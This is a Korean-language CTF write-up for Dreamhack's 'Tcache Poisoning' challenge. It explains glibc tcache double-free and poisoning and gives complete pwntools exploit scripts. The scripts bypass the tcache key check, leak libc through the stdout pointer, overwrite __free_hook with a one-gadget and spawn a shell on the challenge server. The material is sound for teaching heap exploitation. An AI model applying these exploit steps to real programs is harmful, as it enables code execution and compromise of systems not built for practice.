---
title: Tcache Poisoning
description: Dreamhack [Wargame] - Tcache Poisoning
author: juhyeongkim
date: 2024-10-31 00:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
# path: 
    # lqip: 
    # alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/358)

{% raw %}

## Tcache_Poisoning

`Tcache Poisoning`은 `tcache`를 조작하여 **임의 주소에 청크를 할당**시키는 공격 기법을 말한다.

### 원리

동일한 청크가 `Double Free`로 중복으로 연결된 청크를 재할당하면, 그 청크는 할당된 청크이면서 동시에 해제된 청크가 된다. 

따라서, `duplicated free list`가 만들어지고, 청크의 구조를 떠올려 보면 이러한 중첩 상태가 어떻게 문제로 이어지는지 이해할 수 있다.

![청크의 중첩 상태](https://dreamhack-lecture.s3.amazonaws.com/media/2aa990d00c2ac06e318958f5f2a68a7218602c8a2b9ae50169305c9b8364eec7.gif)

위 이미지에서 왼쪽은 `할당된 청크`의 레이아웃이고, 오른쪽은 `해제된 청크`의 레이아웃인데, 이 둘을 겹쳐보면 **할당된 청크에서 데이터를 저장하는 부분**이 **해제된 청크에서는 `fd` 와 `bk` 값을 저장하는 데 사용(`tcache`에서는 `next`와 `key` 저장)** 된다는 것을 알 수 있다.

따라서 공격자가 중첩 상태인 청크에 임의의 값을 쓸 수 있다면, 그 청크의 `fd` 와 `bk` 를 조작할 수 있으며, **이는 다시 말해 `ptmalloc2` 의 `free list`에 임의 주소를 추가할 수 있음을 의미한다.**

왜냐하면, `ptmalloc2`는 `free list`에 존재하는 청크들의 `fd`와 `bk`를 보고 어떤 청크가 존재하는지 파악하기 때문에, 사용자가 원하는 주소를 `fd`나 `bk`로 추가하면 그 주소의 청크가 `free list`에 추가되는 것과 같기 때문이다.

<br>
### 효과

이렇게 되면 `free list`에 추가된 임의의 주소들에 대한 청크들을 `malloc`으로 할당해서, 해당 **청크에 저장되있는 값을 출력**하거나,

해당 청크의 데이터를 조작할 수 있다면, **임의 주소 읽기(Arbitrary Address Read, AAR)** 와 **임의 주소 쓰기(Arbitrary Address Write, AAW)** 가 가능하다.

그럼 이제 이 내용을 통해 `Tcache_Poisoning` 워게임을 풀이해보자.

<br>

## 바이너리 분석

```c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1)
  {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx)
    {
    case 1:
      printf("Size: ");
      scanf("%d", &size);
      chunk = malloc(size);
      printf("Content: ");
      read(0, chunk, size - 1);
      break;
    case 2:
      free(chunk);
      break;
    case 3:
      printf("Content: %s", chunk);
      break;
    case 4:
      printf("Edit chunk: ");
      read(0, chunk, size - 1);
      break;
    default:
      break;
    }
  }

  return 0;
}
```

<img width="677" alt="image" src="https://github.com/user-attachments/assets/7d2f49f5-f517-4b58-8c99-0c5938885a2f">

먼저, `checksec`으로 보호 기법을 살펴보면, `Full RELRO`가 적용되어 있기 때문에 `GOT Overwrite`는 불가능하고 대신 `libc-2.27.so` 버전을 쓰기 때문에 `hook Overwrite`가 가능하다는 것을 생각해볼 수 있다.

그리고 `PIE`가 적용되지 않았기 때문에 `stack, heap, 공유 library`의 주소를 제외하고는 가상 주소가 고정되어 있다는 것도 알 수 있다.

<br>

### 1. Double Free Bug

해당 바이너리를 보면, `Double Free Bug`가 발생가능한 조건을 가지고 있다.

`allocate(1)` -> `free(2)` 이후, 해제한 `chunk`의 포인터를 초기화해주지 않았기 때문에 해당 청크에 다시 접근하여 `edit(4)`를 통해 데이터를 수정할 수 있게 된다.

해제되어 `tcache`에 들어온 `chunk`들의 `chunk + 0x8` 주소에는 `key` 값을 저장하고 있다고 했는데, 해당 값은 할당된 상태에서는 데이터를 저장하고 있다가, `tcache`에 들어오면, `tcache_perthread_struct * tcache`의 값을 저장하게 된다고 하였다.

그리고 `free`를 할 때, `e->key == tcache`이면 `Double Free` 에러를 발생시키며 종료하기 때문에 `chunk + 0x8` 주소의 1비트 값만 바꿔줘도 `Double Free` 에러에 걸리지 않고 `Double Free Bug` 취약점을 발생시킬 수 있다.\
(참고로, `tcache`의 `free list`에 저장된 청크들의 주소가 `N`이라면, 소스 코드 상에 존재하는 `chunk`의 주소는 `N + 0x8`이기 때문에 `key` 값도 `header` 이후부터 시작하게 되어서 `chunk + 0x8`에 위치하게 된다. `tcache` 내부의 청크 기준에서는 당연히 `N + 0x18`이다.)

그럼 `edit`을 통해 `chunk`에 랜덤한 `8바이트 + 1바이트(key 조작)` 값을 대입해주면 동일한 청크에 대해 한번 더 `free`를 할 수 있게 된다.

그럼 여기서 이제, 한 `tcache` 엔트리의 Linked List에 동일한 2개의 청크가 연결된 상태가 되어 버린 `Tcache Poison(Duplicated)` 상태가 되기 때문에 임의 주소 읽기, 임의 주소 쓰기가 가능하게 된다.

과정에 대해서는 뒤의 **Exploit**에서 더 자세히 설명해보겠다.

<br>

### 2. Leak libc base

`libc_base`를 어떻게 Leak 할지가 중요 포인트인데, `setvbuf(stdout, 0, 2, 0);`를 통해 `stdout`을 등록해주면 `bss 세그먼트`에 해당 `stdout`이 위치하게 되고, 해당 전역 변수는 라이브러리의 `_IO_2_1_stdout_`을 가리키게 된다.

따라서, `stdout`이 가리키는 값인 `_IO_2_1_stdout_`을 Leak한 후에 `libc.symbols['stdout']`을 해당 값에서 빼주면 `libc_base`를 구할 수 있다.

**예전에 gdb에서 찾은 `stdout`은 바이너리의 `bss 세그먼트`에 존재하는 전역 변수(포인터)이고, 실제 입출력은 `libc`에 존재하는`_IO_2_1_stdout_`가 담당하고 해당 값을 `stdout`이 저장하고(가리키고)있다는 것을 잘 기억하자.**

바이너리를 보면 `chunk`의 값을 `print(3)` 해줄 수 있다. 그럼 이를 통해 `chunk`에 `stdout`을 대입해줄 수 있다면, `chunk`를 `print`하는 것이 `stdout`을 `print`하는 것이므로 `stdout`이 가리키는 `_IO_2_1_stdout_`을 출력할 수 있을 것이다.

<br>

### 3. Hook Overwrite

`libc_base`를 구했다면, 해당 바이너리에서 `free`를 할 수 있기 때문에 `__free_hook`에 원가젯을 대입해서 쉘을 획득할 수 있을 것이다.

`Tcache Poisoning`을 사용하면 임의 주소 쓰기를 할 수 있다고 하였다.

`tcache`에 존재하는 청크의 `next(fd)`를 조작하여 `__free_hook`을 `tcache`에 추가할 수 있다면, 해당 청크를 `allocate`로 할당하면서 해당 청크에 `og`를 대입해주어서 `__free_hook`이 `og`를 가리키게 될 것이다.

<br>

## Exploit

### [1] Leak libc base

먼저, `libc_base`를 구하기 위해서 `stdout`을 `tcache` 엔트리에 추가해야한다. 그러기 위해선 먼저 `Double Free`를 통해 `tcache Poisoning(Duplication)`을 해주면 된다. 

앞에서 얘기했듯이 `allocate` -> `free` -> `edit`으로 `e->key`를 조작 -> `free` 를 해주면 동일한 청크가 `tcache`에 중복해서 들어가도록 만들 수 있다.

코드는 아래와 같다.

```py
# tcache[0x40] : empty
# chunk : first(1)
allocate(0x30, b'first')


# tcache[0x40] : first(1)
free()  # (1)


# tcache[0x40] : first(1) -> aaaaaaaa
# (chunk + 8)에 위치하는 key를 변조해서 Double Free에 걸리지 않기 위해 b'a' 한개 더 대입
edit(b'a'*0x8 + b'a')


# tcache[0x40] : first(2) -> first(1) + 0x10 (동일한 청크가 tcache에 double free되는 경우 헤더를 넘어서서 0x10이 더해짐)
free()  # (2)
# LIFO 이기 때문에 이후에 해제된 게 linked list의 헤더에 위치 (같은 first이지만, 순서를 구분하고 LIFO를 보여주기 위해 괄호에 코드의 위치인 (2) 추가)
```

<br>

#### 참고

참고로, `tcache` 연결 리스트는 한 thread 당 청크의 크기에 따라 `64`개가 존재하며 하나에 `7`개씩 연결될 수 있다.  따라서, `0x30` 청크를 할당하면 청크의 헤더(metadata) 크기를 포함해서 `tcache[0x40]`에 할당될 것이다.

또한, `LIFO`이기 때문에 `tcache[0x40]` 연결 리스트의 header에 가장 마지막에 해제된 청크가 위치하고, `next`에 그 이전에 연결된 청크가 최근 순으로 계속 쌓여나갈 것이다. (새로 해제된 청크가 제일 앞에 연결된다고 생각하면 된다.)

<br>

#### 다시 돌아와서..

그럼 이제, `tcache`를 오염시키는 것까지는 성공했기 때문에 중복된 청크를 할당하여 데이터를 write함으로써, `tcache`에 임의의 주소(청크)를 추가할 수 있게 된다.

`allocate(0x30, stdout)`을 해주면, `allocated chunk list`와 `freed chunk list`에 동시에 존재하는 청크에 `stdout`의 주소를 대입하게 되고, `freed chunk list`인 `tcache`의 `next`에 `stdout`이 추가될 것이다.

`allocated chunk list`와 `freed chunk list`의 동일한 청크에 대해 `data`의 위치와 `next(fd)`의 위치가 동일하기 때문이다.

그럼 이제 한번 더 아무 값이나 `allocate`를 해서 `duplicated`된 동일 청크는 이제 사용할 필요가 없기 때문에 빼주고, (아무 값이나 해도 할당 후 데이터를 대입하므로, 할당 직후 데이터를 대입하기 전에 `tcache`의 연결 리스트 헤더가 `stdout` 청크를 가리키게 되어 아무 영향이 없다.)

<br>

#### 주의할 점

**근데 여기서, `allocate`를 해서 `duplicated`된 동일한 청크를 빼는 방식은 `tc_idx--;`를 유발하기 때문에 `edit`을 통해 `duplicated`된 동일한 청크를 빼면서 동시에 `stdout` 청크를 추가하는 방식이 더 적절하다.**

해당 문제 환경이 `tc_idx`가 도입되어있지 않았기 때문에, 드림핵 풀이에서는 `tcache`가 변하는 과정을 보여주려고 `allocate`를 쓴 것 같은데, 

`tc_idx`가 도입되었다면 `allocate`할 때, `tc_idx`가 `1`이상을 유지하여 `tcache`에서 청크를 뺴오기 위해 `Double Free` 직후 `allocate`가 아닌 `edit`으로 청크를 뺴야한다.

그래야 `tc_idx`가 줄어들지 않아서 `tc_idx >= 1`이 유지된다. 이 방법은 `tcache_dup2` 문제를 참고하자.

---

그럼 일단 드림핵 풀이 과정대로 해보면, 한번 더 `allocate`를 통해 `stdout` 청크를 빼준 후 `print`를 해주면 `stdout` 청크가 가리키는 `_IO_2_1_stdout_`의 주소를 출력할 수 있을 것이다.\
(`print` 하기 전에 `recvuntil`로 `"Content: "` 문자열을 미리 빼줘야하는거 주의하자.)

**여기서 매우 중요한게, `allocate`를 통해 `stdout`을 빼낼 때, `stdout`의 데이터에는 `_IO_2_1_stdout_`이 대입되어 있기 때문에 위의 몇가지 경우처럼 아무 값이나 대입하면서 `allocate` 해주면 `_IO_2_1_stdout_`이 변조되어 제대로 된 `libc_base`를 구할 수도 없고 입출력 자체가 망가져 버린다.**

**따라서, `allocate`를 할 때, `p64(libc.symbols['_IO_2_1_stdout_'])[0:1]`을 통해 `_IO_2_1_stdout_`의 `LSB(가장 낮은 바이트)`를 대입해주면 된다.**

**왜냐하면, `ASLR`이 적용되어도 페이징 기법으로 하위 `12bits`는 페이지 오프셋을 나타내서 베이스 주소에 변함없이 고정되어 있기 때문에 `LSB`를 대입해줘도 값의 변조가 없기 때문이다. `p64`에서 첫번째 문자열이 `LSB`를 나타내기 때문에 `[0:1]`을 해주었다.**\
(참고로, `allocate` 함수에서 데이터를 입력할 때, `read`로 받기 때문에 `send`가 아닌 `sendline`으로 보내면 `LSB + \n`이 전달되서 `_IO_2_1_stdout_`의 하위 2바이트가 `\xa0`으로 바뀌니까 무조건 `send`로 보내야 하는거 주의하자.)

그럼 이제 `libc_base`를 구하는 것까지 완료했다. 이게 **임의 주소 읽기** 과정이다.

```py
# tcache[0x40] : first(1) + 0x10 -> stdout -> _IO_2_1_stdout_
# chunk : first(2)
stdout = elf.symbols['stdout']
allocate(0x30, p64(stdout))
# 청크의 데이터 영역에 stdout을 대입하면 next가 stdout을 가리키게 되고,
# stdout의 메모리에 저장된 값은 _IO_2_1_stdout_이므로 stdout의next는 다시 _IO_2_1_stdout_을 가리킴


# tcache[0x40] : stdout -> _IO_2_1_stdout_
# chunk : first(1) (tcache에 들어갈 때는 동일한 청크이면 `+0x10`이 되었지만 할당될때는 또 `+0x10`이 되지 않고 그대로 동일한 청크 주소가 할당됨)
allocate(0x30, b'a')
# 어떤 값을 대입하면서 allocate하더라도 이미 tcache에는 stdout이 링크드 리스트의 헤더(청크의 헤더X)로 존재하므로 상관없음


# tcache[0x40] : _IO_2_1_stdout_
# chunk : stdout
_IO_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]  # 첫번째 문자열 가져옴 : 문자열에서 첫번째는 lsb
allocate(0x30, _IO_2_1_stdout_lsb)
# 여기서 중요한게, 바로 아래에서 print_chunk를 할건데, stdout에 저장된(가리키는) _IO_2_1_stdout_을 변조하면 안됨
# 하지만 libc base를 몰라서 IO_stdout을 모르지만, 다행히 하위 3비트는 오프셋으로 고정되어 있어서 하위 1바이트인 lsb도 고정되있어서 lsb를 대입해주면 됨(리틀엔디언 잘 생각)


print_chunk()  # stdout에 저장된 IO_2_1_stdout_lsb 주소 출력
p.recvuntil(b'Content: ')  # print_chunk에서 'Content: '는 안받아줬기 때문에 여기까지 받아줘야 libc_base를 제대로 계산 가능

# Leak libc base
libc_base = u64(p.recvn(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
```

<br>

#### 참고 (더 공부해서 보완)

`free list`의 청크들 끼리 연결 리스트로 연결할 때, 서로 다른 주소의 청크를 연결할 때는 gdb의 `heap` 명령어를 통해 출력되는 청크의 시작 주소대로 `fd`에 연결되지만, 

동일한 청크를 서로 연결할 때는 아래의 이미지와 같이 동일한 청크임에도 불구하고, `0x10`만큼 더해진 청크가 연결된다. 

![image](https://github.com/user-attachments/assets/d2af5302-c924-4780-9253-3b0b8f5e8bd0)

해당 이유를 명확히 밝혀내지는 못하였는데, 동일한 청크는 `header(metadata)` 때문에 밀려서 연결된다는 답이 있긴 하다.

그리고 `heap`의 `tcache`에서는 이렇게 주소가 차이나지만, 실제로 `malloc`을 연속 2번해서 보면 하나는 `+ 0x10`이 된 주소가 아니라, 당연히 똑같은 청크이기 때문에 똑같은 주소가 `malloc`을 통해 리턴된다.

<br>

### [2] Hook Overwrite

그럼 이제 **임의 주소 쓰기**를 통한 `Hook Overwrite`를 어떻게 할지 설계해보자.

당연히 이 과정도 `Tcache Poisoning`이 필요하기 때문에 Leak libc base에서 한 첫번째 과정대로 `duplicated free list(tcache)`를 만들어 준다.

**근데 여기서 매우 주의할 점이 위에서 `tcache[0x40]`의 연결 리스트를 오염시킨 결과로 `tcache`에 `_IO_2_1_stdout`이 존재하기 때문에 해당 연결 리스트에 다시 조작을 하면 표준 입출력 함수가 조작될 수 있기 때문에 새로운 크기의 `tcache[0x50]`으로 다시 시작해줘야 한다.**

그럼 이제 미리 `libc_base`를 통해 `__free_hook`과 `og`를 계산해주고, `__free_hook`의 값을 조작해야 하기 때문에 `allocate(0x40, p64(__free_hook))`으로 `__free_hook`을 `tcache[0x50]`에 추가해준다.

<br>

#### 보완할 부분 (원가젯 조건 확인 추가)

![image](https://github.com/user-attachments/assets/1a86b142-d49e-453d-b3f1-c06cb5c87426)

그럼 이제 `tcache[0x50]`에는 처음에 `duplicated` 시킨 청크와 `next`로 `__free_hook` 청크가 연결되어 있기 때문에, 일단 처음에 중복시킨 청크는 더이상 쓸 일이 없기 때문에 아무 값으로나 `allocate`해서 빼주고,

이제 `__free_hook` 청크를 `allocate` 하며 빼주면서 `__free_hook`의 데이터에 `og`를 대입해주면 `__free_hook`이 `og`를 가리키게 될 것이다.

그럼 바로 `free`를 호출해서 훅을 통해 원가젯을 실행시키면 익스플로잇 성공이다.

```py
free_hook = libc_base + libc.symbols['__free_hook']

# og = libc_base + 0x4f3ce
# og = libc_base + 0x4f3d5
og = libc_base + 0x4f432
# og = libc_base + 0x10a41c


# 여기서 tcache[0x40] 을 다시 쓰면 _IO_2_1_stdout_을 가져오는데 이 주소의 값을 바꾸면 안되므로 다른 tcache 엔트리르 써야함

# tcache[0x50] : empty
# chunk : first(1)
allocate(0x40, b'first')


# tcahce[0x50] : first(1)
free()


# tcache[0x50] : first(1) -> aaaaaaaa
edit(b'a'*0x8 + b'a')


# tcache[0x50] : first(2) -> first(1) + 0x10
free()


# tcache[0x50] : first(1) + 0x10 -> free_hook
# chunk : first(2)
allocate(0x40, p64(free_hook))


# tcache[0x50] : free_hook
# chunk : first(1)
allocate(0x40, b'a')


# tcache[0x50] : empty
# chunk : free_hook
allocate(0x40, p64(og))  # free_hook이 저장된 주소에 og가 저장되어 free_hook -> og를 가리키게 됨


# Exploit
free()
p.interactive()
```

<br>

## 전체 Expolit 코드 : **ex.py**

```py
from pwn import *

p = remote('host3.dreamhack.games', 22594)
elf = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')


def allocate(size, content):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', content)  # 나중에 _IO_2_1_stdout__lsb를 보낼때 sendline으로 보내면 공백이 추가되서 안됨


def free():
    p.sendlineafter(b'Edit\n', b'2')


def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')


def edit(content):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b'Edit chunk: ', content)


# tcache[0x40] : empty
# chunk : first(1)
allocate(0x30, b'first')


# tcache[0x40] : first(1)
free()  # (1)


# tcache[0x40] : first(1) -> aaaaaaaa
# (chunk + 8)에 위치하는 key를 변조해서 Double Free에 걸리지 않기 위해 b'a' 한개 더 대입
edit(b'a'*0x8 + b'a')


# tcache[0x40] : first(2) -> first(1) + 0x10 (동일한 청크가 tcache에 double free되는 경우 헤더를 넘어서서 0x10이 더해짐)
free()  # (2)
# LIFO 이기 때문에 이후에 해제된 게 linked list의 헤더에 위치 (같은 first이지만, 순서를 구분하고 LIFO를 보여주기 위해 괄호에 코드의 위치인 (2) 추가)


# tcache[0x40] : first(1) + 0x10 -> stdout -> _IO_2_1_stdout_
# chunk : first(2)
stdout = elf.symbols['stdout']
allocate(0x30, p64(stdout))
# 청크의 데이터 영역에 stdout을 대입하면 next가 stdout을 가리키게 되고,
# stdout의 메모리에 저장된 값은 _IO_2_1_stdout_이므로 stdout의next는 다시 _IO_2_1_stdout_을 가리킴


# tcache[0x40] : stdout -> _IO_2_1_stdout_
# chunk : first(1) (tcache에 들어갈 때는 동일한 청크이면 `+0x10`이 되었지만 할당될때는 또 `+0x10`이 되지 않고 그대로 동일한 청크 주소가 할당됨)
allocate(0x30, b'a')
# 어떤 값을 대입하면서 allocate하더라도 이미 tcache에는 stdout이 링크드 리스트의 헤더(청크의 헤더X)로 존재하므로 상관없음


# tcache[0x40] : _IO_2_1_stdout_
# chunk : stdout
_IO_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]  # 첫번째 문자열 가져옴 : 문자열에서 첫번째는 lsb
allocate(0x30, _IO_2_1_stdout_lsb)
# 여기서 중요한게, 바로 아래에서 print_chunk를 할건데, stdout에 저장된(가리키는) _IO_2_1_stdout_을 변조하면 안됨
# 하지만 libc base를 몰라서 IO_stdout을 모르지만, 다행히 하위 3비트는 오프셋으로 고정되어 있어서 하위 1바이트인 lsb도 고정되있어서 lsb를 대입해주면 됨(리틀엔디언 잘 생각)


print_chunk()  # stdout에 저장된 IO_2_1_stdout_lsb 주소 출력
p.recvuntil(b'Content: ')  # print_chunk에서 'Content: '는 안받아줬기 때문에 여기까지 받아줘야 libc_base를 제대로 계산 가능

# Leak libc base
libc_base = u64(p.recvn(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

# og = libc_base + 0x4f3ce
# og = libc_base + 0x4f3d5
og = libc_base + 0x4f432
# og = libc_base + 0x10a41c


# 여기서 tcache[0x40] 을 다시 쓰면 _IO_2_1_stdout_을 가져오는데 이 주소의 값을 바꾸면 안되므로 다른 tcache 엔트리르 써야함

# tcache[0x50] : empty
# chunk : first(1)
allocate(0x40, b'first')


# tcahce[0x50] : first(1)
free()


# tcache[0x50] : first(1) -> aaaaaaaa
edit(b'a'*0x8 + b'a')


# tcache[0x50] : first(2) -> first(1) + 0x10
free()


# tcache[0x50] : first(1) + 0x10 -> free_hook
# chunk : first(2)
allocate(0x40, p64(free_hook))


# tcache[0x50] : free_hook
# chunk : first(1)
allocate(0x40, b'a')


# tcache[0x50] : empty
# chunk : free_hook
allocate(0x40, p64(og))  # free_hook이 저장된 주소에 og가 저장되어 free_hook -> og를 가리키게 됨


# Exploit
free()
p.interactive()
```

<br>

## 다른 방법 : **Double Free** 없이 **tcache**에 청크를 추가하는 방법 : **ex1.py**

처음에 위의 방식대로 `ex.py`로 `Double Free`를 통한 `tcache poisoning`을 하였는데, `tcache_dup2` 문제를 풀면서 생각해보니,

**`Double Free`를 해주지 않고도 `edit` 함수가 있으면 원하는 주소의 청크를 추가할 수 있다는 것을 알게 되었다.**

따라서, `청크 할당 -> 청크 해제 -> 청크 수정(추가하고 싶은 주소)`를 해주면 `Double Free`를 해주지 않아도 `stdout`이나 `free_hook`처럼 원하는 청크를 `tcache`에 추가할 수 있다.

이후 방법은 똑같이, 추가한 청크를 `allocate`로 뺀 후에 출력해서 값을 얻거나(`_IO_2_1_stdout_`), 해당 주소에 값을 조작(`og`)하면 된다.

하지만 이건 `tc_idx`가 도입되지 않은 버전이라서 가능한 것이기 때문에, 항상 `tc_idx` 검사가 있다고 생각하고 `Double Free`를 통해 `tc_idx`를 `1` 이상으로 만들어줘야 한다.\
(`Double Free`에서도 이번 문제에서는 `edit` 순서를 신경써주지 않아서 `tc_idx`가 `0`이 되었지만 실제로는 `edit`을 먼저 해서 `tc_idx >= 1`을 유지해야한다.)

```py
from pwn import *

p = remote('host3.dreamhack.games', 16758)
elf = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')


def allocate(size, content):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', content)  # 나중에 _IO_2_1_stdout__lsb를 보낼때 sendline으로 보내면 공백이 추가되서 안됨


def free():
    p.sendlineafter(b'Edit\n', b'2')


def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')


def edit(content):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b'Edit chunk: ', content)


# tcache[0x40] : empty
# chunk : first(1)
allocate(0x30, b'first')


# tcache[0x40] : first(1)
# chunk : first(1)
free()  # (1)


# tcache[0x40] : first(1) -> stdout -> _IO_2_1_stdout_
# chunk : first(1)
stdout = elf.symbols['stdout']
edit(p64(stdout))


# tcache[0x40] : stdout -> _IO_2_1_stdout_
# chunk : first(1)
allocate(0x30, b'a')
# 어떤 값을 대입하면서 allocate하더라도 이미 tcache에는 stdout이 링크드 리스트의 헤더(청크의 헤더X)로 존재하므로 상관없음


# tcache[0x40] : _IO_2_1_stdout_
# chunk : stdout
_IO_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]  # 첫번째 문자열 가져옴 : 문자열에서 첫번째는 lsb
allocate(0x30, _IO_2_1_stdout_lsb)
# 여기서 중요한게, 바로 아래에서 print_chunk를 할건데, stdout에 저장된(가리키는) _IO_2_1_stdout_을 변조하면 안됨
# 하지만 libc base를 몰라서 IO_stdout을 모르지만, 다행히 하위 3비트는 오프셋으로 고정되어 있어서 하위 1바이트인 lsb도 고정되있어서 lsb를 대입해주면 됨(리틀엔디언 잘 생각)


print_chunk()  # stdout에 저장된 IO_2_1_stdout_lsb 주소 출력
p.recvuntil(b'Content: ')  # print_chunk에서 'Content: '는 안받아줬기 때문에 여기까지 받아줘야 libc_base를 제대로 계산 가능

# Leak libc base
libc_base = u64(p.recvn(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

# og = libc_base + 0x4f3ce
# og = libc_base + 0x4f3d5
og = libc_base + 0x4f432
# og = libc_base + 0x10a41c


# 여기서 tcache[0x40] 을 다시 쓰면 _IO_2_1_stdout_을 가져오는데 이 주소의 값을 바꾸면 안되므로 다른 tcache 엔트리를 써야함

# tcache[0x50] : empty
# chunk : first(1)
allocate(0x40, b'first')


# tcahce[0x50] : first(1)
# chunk : first(1)
free()


# tcache[0x50] : first(1) -> free_hook
# chunk : first(1)
edit(p64(free_hook))


# tcache[0x50] : free_hook
# chunk : first(1)
allocate(0x40, b'a')


# tcache[0x50] : empty
# chunk : free_hook
allocate(0x40, p64(og))  # free_hook이 저장된 주소에 og가 저장되어 free_hook -> og를 가리키게 됨


# Exploit
free()
p.interactive()
```

{% endraw %}